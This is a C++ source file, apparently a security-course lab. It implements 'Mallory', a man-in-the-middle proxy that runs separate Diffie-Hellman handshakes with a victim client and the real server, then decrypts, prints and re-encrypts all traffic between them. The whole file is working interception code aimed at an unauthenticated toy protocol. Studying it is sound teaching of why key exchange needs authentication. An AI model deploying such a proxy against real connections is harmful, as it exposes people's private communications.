#include <atomic>
#include <csignal>
#include <iostream>
#include <mutex>
#include <string>
#include <thread>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#include <openssl/bn.h>

#include "helpers.h"

using namespace std;

// ------------------------------------------------------------
// Configuration
// ------------------------------------------------------------

// Mallory listens here for the victim client.
constexpr int MALLORY_PORT = 5001;

// Your real server is still running on port 5000.
constexpr int SERVER_PORT = 5000;

// Change this to the Server VM's IP address.
constexpr const char *SERVER_IP = "192.168.0.104";

mutex cout_mutex;
atomic<bool> stopping{false};


// ------------------------------------------------------------
// Utility: close socket safely
// ------------------------------------------------------------

static void close_socket(int &fd) {
    if (fd >= 0) {
        shutdown(fd, SHUT_RDWR);
        close(fd);
        fd = -1;
    }
}


// ------------------------------------------------------------
// DH #1
//
// Mallory acts as the SERVER to the victim client.
//
// Client expects:
//
//     Server -> "DH_INIT <server_public>"
//     Client -> "DH_RESP <client_public>"
//     Server -> "DH_OK"
//
// Mallory performs that exact exchange.
//
// Result:
//
//     client_key = shared key between Client and Mallory
// ------------------------------------------------------------

static bool perform_dh_with_client(
    int client_fd,
    aesgcm::Key &client_key)
{
    BN_CTX *ctx = BN_CTX_new();

    if (!ctx) {
        perror("BN_CTX_new failed");
        return false;
    }

    dh::KeyPair mallory_keypair;

    try {

        // Mallory generates her own DH private/public key pair.
        mallory_keypair = dh::generate_keypair(ctx);

        // Mallory pretends to be the server and sends DH_INIT.
        string dh_init = "DH_INIT " + dh::bn_to_hex(mallory_keypair.pub) + "\n";

        if (!send_plain(client_fd, dh_init)) {
            cerr << "[MALLORY] Failed to send DH_INIT to client.\n";

            dh::free_keypair(mallory_keypair);
            BN_CTX_free(ctx);

            return false;
        }

        cout << "[MITM] DH_INIT sent to client." << endl;

        // Client sends its public DH value.
        string client_response;

        if (!recv_plain_line(client_fd, client_response)) {
            cerr << "[MALLORY] Client disconnected during DH.\n";

            dh::free_keypair(mallory_keypair);
            BN_CTX_free(ctx);

            return false;
        }

        // Expected:
        //
        // DH_RESP <client_public>
        //
        if (client_response.rfind("DH_RESP ", 0) != 0) {
            cerr << "[MALLORY] Unexpected client DH message: " << client_response << endl;

            dh::free_keypair(mallory_keypair);
            BN_CTX_free(ctx);

            return false;
        }

        string client_public_hex = client_response.substr(8);

        if (client_public_hex.empty()) {
            cerr << "[MALLORY] Empty client DH public value.\n";

            dh::free_keypair(mallory_keypair);
            BN_CTX_free(ctx);

            return false;
        }

        // Convert client's hexadecimal public value into BIGNUM.
        BIGNUM *client_public = nullptr;

        if (!dh::hex_to_bn(&client_public, client_public_hex)) {
            cerr << "[MALLORY] Failed to parse client DH public value.\n";

            dh::free_keypair(mallory_keypair);
            BN_CTX_free(ctx);

            return false;
        }

        // Send DH_OK exactly as the real server does.
        if (!send_plain(client_fd, "DH_OK\n")) {
            cerr << "[MALLORY] Failed to send DH_OK to client.\n";

            BN_free(client_public);
            dh::free_keypair(mallory_keypair);
            BN_CTX_free(ctx);

            return false;
        }

        // Calculate:
        //
        // shared = client_public ^ mallory_private mod p
        //
        // This produces K_CM.
        BIGNUM *shared_secret = dh::compute_shared_secret(mallory_keypair, client_public, ctx);

        // Convert shared secret -> AES-256 key.
        client_key = dh::derive_aes_key(shared_secret);

        cout << "\n[MALLORY] Client <-> Mallory DH complete." << endl;
        cout << "[MALLORY] Client-side AES fingerprint: " << dh::fingerprint_hex(client_key) << endl;

        // Clean sensitive/intermediate data.
        BN_free(client_public);
        BN_clear_free(shared_secret);
        dh::free_keypair(mallory_keypair);
        BN_CTX_free(ctx);

        return true;

    } catch (const exception &e) {
        cerr << "[MALLORY] Client DH error: " << e.what() << endl;

        dh::free_keypair(mallory_keypair);
        BN_CTX_free(ctx);

        return false;
    }
}


// ------------------------------------------------------------
// DH #2
//
// Mallory acts as the CLIENT to the real server.
//
// Server expects:
//
//     Server -> "DH_INIT <server_public>"
//     Mallory -> "DH_RESP <mallory_public>"
//     Server -> "DH_OK"
//
// Result:
//
//     server_key = shared key between Mallory and Server
// ------------------------------------------------------------

static bool perform_dh_with_server(
    int server_fd,
    aesgcm::Key &server_key)
{
    BN_CTX *ctx = BN_CTX_new();

    if (!ctx) {
        perror("BN_CTX_new failed");
        return false;
    }

    dh::KeyPair mallory_keypair;

    try {
        // Server sends its DH_INIT first.
        string server_handshake;

        if (!recv_plain_line(server_fd, server_handshake)) {
            cerr << "[MALLORY] Server disconnected during DH.\n";

            BN_CTX_free(ctx);
            return false;
        }

        // Expected:
        //
        // DH_INIT <server_public>
        //
        if (server_handshake.rfind("DH_INIT ", 0) != 0) {
            cerr << "[MALLORY] Unexpected server DH message: " << server_handshake << endl;

            BN_CTX_free(ctx);
            return false;
        }

        string server_public_hex = server_handshake.substr(8);

        if (server_public_hex.empty()) {
            cerr << "[MALLORY] Empty server DH public value.\n";

            BN_CTX_free(ctx);
            return false;
        }

        // Convert server's public DH value.
        BIGNUM *server_public = nullptr;

        if (!dh::hex_to_bn(&server_public, server_public_hex)) {
            cerr << "[MALLORY] Failed to parse server DH public value.\n";

            BN_CTX_free(ctx);
            return false;
        }

        // Mallory creates a NEW DH key pair.
        // This is NOT the key pair used with the client.
        mallory_keypair = dh::generate_keypair(ctx);

        // Mallory responds as if she were the client.
        string dh_response = "DH_RESP " + dh::bn_to_hex(mallory_keypair.pub) + "\n";

        if (!send_plain(server_fd, dh_response)) {
            cerr << "[MALLORY] Failed to send DH_RESP to server.\n";

            BN_free(server_public);
            dh::free_keypair(mallory_keypair);
            BN_CTX_free(ctx);

            return false;
        }

        // Wait for the real server's DH_OK.
        string server_ack;

        if (!recv_plain_line(server_fd, server_ack)) {
            cerr << "[MALLORY] Server disconnected before DH_OK.\n";

            BN_free(server_public);
            dh::free_keypair(mallory_keypair);
            BN_CTX_free(ctx);

            return false;
        }

        if (server_ack != "DH_OK") {
            cerr << "[MALLORY] Unexpected server response: " << server_ack << endl;

            BN_free(server_public);
            dh::free_keypair(mallory_keypair);
            BN_CTX_free(ctx);

            return false;
        }

        // Calculate:
        // shared = server_public ^ mallory_private mod p
        // This produces K_MS.
        BIGNUM *shared_secret = dh::compute_shared_secret(mallory_keypair, server_public, ctx);

        // Convert shared secret to AES-256 key.
        server_key = dh::derive_aes_key(shared_secret);

        cout << "\n[MALLORY] Mallory <-> Server DH complete." << endl;
        cout << "[MALLORY] Server-side AES fingerprint: " << dh::fingerprint_hex(server_key) << endl;

        // Clean up.
        BN_free(server_public);
        BN_clear_free(shared_secret);
        dh::free_keypair(mallory_keypair);
        BN_CTX_free(ctx);

        return true;

    } catch (const exception &e) {
        cerr << "[MALLORY] Server DH error: " << e.what() << endl;

        dh::free_keypair(mallory_keypair);
        BN_CTX_free(ctx);

        return false;
    }
}


// ------------------------------------------------------------
// Client -> Mallory -> Server
//
// Mallory:
//     1. receives encrypted message from client
//     2. decrypts using client_key
//     3. prints plaintext
//     4. encrypts using server_key
//     5. sends to server
// ------------------------------------------------------------

static void forward_client_to_server(
    int client_fd,
    int server_fd,
    const aesgcm::Key &client_key,
    const aesgcm::Key &server_key)
{
    while (!stopping.load()) {

        string plaintext;

        auto status =
            aesgcm::recv_encrypted(
                client_fd,
                client_key,
                plaintext);


        if (status == aesgcm::RecvStatus::DISCONNECTED) {

            cout << "\n[MALLORY] Client disconnected.\n";

            stopping.store(true);

            shutdown(server_fd, SHUT_RDWR);

            return;
        }


        if (status == aesgcm::RecvStatus::AUTH_FAILED) {

            cout << "\n[MALLORY] Client -> Mallory authentication failed."
                 << endl;

            stopping.store(true);

            shutdown(server_fd, SHUT_RDWR);

            return;
        }


        if (status == aesgcm::RecvStatus::ERROR) {

            cout << "\n[MALLORY] Error receiving from client."
                 << endl;

            stopping.store(true);

            shutdown(server_fd, SHUT_RDWR);

            return;
        }


        // At this point Mallory successfully decrypted
        // the message using K_CM.
        {
            lock_guard<mutex> lock(cout_mutex);

            cout << "\n========================================" << endl;
            cout << "[MALLORY] CLIENT -> SERVER" << endl;
            cout << "[CAPTURED PLAINTEXT] " << plaintext << endl;
            cout << "========================================" << endl;
        }


        // Re-encrypt using K_MS.
        if (!aesgcm::send_encrypted(
                server_fd,
                server_key,
                plaintext)) {

            cerr << "[MALLORY] Failed to forward message to server.\n";

            stopping.store(true);

            shutdown(client_fd, SHUT_RDWR);

            return;
        }
    }
}


// ------------------------------------------------------------
// Server -> Mallory -> Client
//
// Mallory:
//     1. receives encrypted message from server
//     2. decrypts using server_key
//     3. prints plaintext
//     4. encrypts using client_key
//     5. sends to client
// ------------------------------------------------------------

static void forward_server_to_client(
    int server_fd,
    int client_fd,
    const aesgcm::Key &server_key,
    const aesgcm::Key &client_key)
{
    while (!stopping.load()) {

        string plaintext;

        auto status =
            aesgcm::recv_encrypted(
                server_fd,
                server_key,
                plaintext);


        if (status == aesgcm::RecvStatus::DISCONNECTED) {

            cout << "\n[MALLORY] Server disconnected.\n";

            stopping.store(true);

            shutdown(client_fd, SHUT_RDWR);

            return;
        }


        if (status == aesgcm::RecvStatus::AUTH_FAILED) {

            cout << "\n[MALLORY] Server -> Mallory authentication failed."
                 << endl;

            stopping.store(true);

            shutdown(client_fd, SHUT_RDWR);

            return;
        }


        if (status == aesgcm::RecvStatus::ERROR) {

            cout << "\n[MALLORY] Error receiving from server."
                 << endl;

            stopping.store(true);

            shutdown(client_fd, SHUT_RDWR);

            return;
        }


        // Mallory successfully decrypted the server message.
        {
            lock_guard<mutex> lock(cout_mutex);

            cout << "\n========================================" << endl;
            cout << "[MALLORY] SERVER -> CLIENT" << endl;
            cout << "[CAPTURED PLAINTEXT] " << plaintext << endl;
            cout << "========================================" << endl;
        }


        // Re-encrypt using the client-side key.
        if (!aesgcm::send_encrypted(
                client_fd,
                client_key,
                plaintext)) {

            cerr << "[MALLORY] Failed to forward message to client.\n";

            stopping.store(true);

            shutdown(server_fd, SHUT_RDWR);

            return;
        }
    }
}


// ------------------------------------------------------------
// Main
// ------------------------------------------------------------

int main()
{
    std::signal(SIGPIPE, SIG_IGN);

    cout << "============================================\n";
    cout << "        MALLORY MITM PROXY\n";
    cout << "============================================\n";
    cout << "Listening port : " << MALLORY_PORT << endl;
    cout << "Server IP      : " << SERVER_IP << endl;
    cout << "Server port    : " << SERVER_PORT << endl;
    cout << "============================================\n\n";

    // --------------------------------------------------------
    // 1. Create listening socket
    // --------------------------------------------------------

    int listen_fd = socket(AF_INET, SOCK_STREAM, 0);

    if (listen_fd < 0) {
        perror("[MALLORY] Socket creation failed");
        return 1;
    }

    // Allow quick restart after the program exits.
    int opt = 1;

    if (setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        perror("[MALLORY] setsockopt failed");
        close(listen_fd);
        return 1;
    }

    // --------------------------------------------------------
    // 2. Bind Mallory's listening socket
    // --------------------------------------------------------

    sockaddr_in mallory_addr{};
    mallory_addr.sin_family = AF_INET;
    mallory_addr.sin_port = htons(MALLORY_PORT);

    // Listen on all interfaces of Mallory VM.
    mallory_addr.sin_addr.s_addr = INADDR_ANY;


    if (bind(
            listen_fd,
            reinterpret_cast<sockaddr *>(&mallory_addr),
            sizeof(mallory_addr)) < 0) {

        perror("[MALLORY] Bind failed");

        close(listen_fd);

        return 1;
    }


    // --------------------------------------------------------
    // 3. Start listening
    // --------------------------------------------------------

    if (listen(listen_fd, 4) < 0) {

        perror("[MALLORY] Listen failed");

        close(listen_fd);

        return 1;
    }


        cout << "[MALLORY] Waiting for victim client on port "
            << MALLORY_PORT << "...\n";


    // --------------------------------------------------------
    // 4. Accept victim client
    // --------------------------------------------------------

    sockaddr_in client_addr{};
    socklen_t client_len =
        sizeof(client_addr);

    int client_fd =
        accept(
            listen_fd,
            reinterpret_cast<sockaddr *>(&client_addr),
            &client_len);

    if (client_fd < 0) {

        perror("[MALLORY] Accept failed");

        close(listen_fd);

        return 1;
    }


    string client_ip =
        inet_ntoa(client_addr.sin_addr);

    cout << "[MALLORY] Victim connected from "
         << client_ip << endl;


    // --------------------------------------------------------
    // 5. Connect Mallory to REAL SERVER
    // --------------------------------------------------------

    int server_fd =
        socket(AF_INET, SOCK_STREAM, 0);

    if (server_fd < 0) {

        perror("[MALLORY] Server socket creation failed");

        close(client_fd);
        close(listen_fd);

        return 1;
    }


    sockaddr_in server_addr{};

    server_addr.sin_family = AF_INET;
    server_addr.sin_port =
        htons(SERVER_PORT);


    if (inet_pton(
            AF_INET,
            SERVER_IP,
            &server_addr.sin_addr) <= 0) {

        cerr << "[MALLORY] Invalid server IP: "
             << SERVER_IP << endl;

        close(server_fd);
        close(client_fd);
        close(listen_fd);

        return 1;
    }


    cout << "[MALLORY] Connecting to real server "
         << SERVER_IP << ":"
         << SERVER_PORT << "...\n";


    if (connect(
            server_fd,
            reinterpret_cast<sockaddr *>(&server_addr),
            sizeof(server_addr)) < 0) {

        perror("[MALLORY] Connection to server failed");

        close(server_fd);
        close(client_fd);
        close(listen_fd);

        return 1;
    }


    cout << "[MALLORY] Connected to real server.\n";


    // --------------------------------------------------------
    // 6. FIRST DH EXCHANGE
    //
    // Client <-> Mallory
    // --------------------------------------------------------

    aesgcm::Key client_key{};

    cout << "\n[MALLORY] Starting DH exchange #1 "
            "(Client <-> Mallory)...\n";


    if (!perform_dh_with_client(
            client_fd,
            client_key)) {

        cerr << "[MALLORY] Client-side DH failed.\n";

        close(server_fd);
        close(client_fd);
        close(listen_fd);

        return 1;
    }


    // --------------------------------------------------------
    // 7. SECOND DH EXCHANGE
    //
    // Mallory <-> Server
    // --------------------------------------------------------

    aesgcm::Key server_key{};

    cout << "\n[MALLORY] Starting DH exchange #2 "
            "(Mallory <-> Server)...\n";


    if (!perform_dh_with_server(
            server_fd,
            server_key)) {

        cerr << "[MALLORY] Server-side DH failed.\n";

        close(server_fd);
        close(client_fd);
        close(listen_fd);

        return 1;
    }


    // --------------------------------------------------------
    // 8. Show the two DIFFERENT keys/fingerprints
    // --------------------------------------------------------

    cout << "\n============================================\n";
    cout << "           MITM ESTABLISHED\n";
    cout << "============================================\n";

    cout << "Client <-> Mallory fingerprint:\n"
         << dh::fingerprint_hex(client_key)
         << "\n\n";

    cout << "Mallory <-> Server fingerprint:\n"
         << dh::fingerprint_hex(server_key)
         << "\n";

    cout << "============================================\n";


    // --------------------------------------------------------
    // 9. Start bidirectional forwarding
    // --------------------------------------------------------

    cout << "\n[MALLORY] Starting encrypted traffic interception...\n";
    cout << "[MALLORY] Waiting for messages...\n\n";


    thread client_to_server(
        forward_client_to_server,
        client_fd,
        server_fd,
        client_key,
        server_key);


    thread server_to_client(
        forward_server_to_client,
        server_fd,
        client_fd,
        server_key,
        client_key);


    // Wait for either side to terminate.
    client_to_server.join();
    server_to_client.join();


    // --------------------------------------------------------
    // 10. Cleanup
    // --------------------------------------------------------

    stopping.store(true);

    close_socket(client_fd);
    close_socket(server_fd);
    close_socket(listen_fd);

    cout << "\n[MALLORY] Proxy stopped.\n";

    return 0;
}